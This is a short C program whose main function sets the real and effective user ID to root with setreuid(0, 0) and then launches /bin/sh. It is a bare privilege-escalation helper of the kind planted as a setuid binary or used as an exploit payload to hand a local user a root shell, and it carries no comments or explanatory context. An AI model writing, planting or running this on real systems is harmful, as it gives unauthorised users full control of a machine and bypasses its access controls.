#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv)
{
    setreuid(0, 0);
    system("/bin/sh");
    return 0;
}
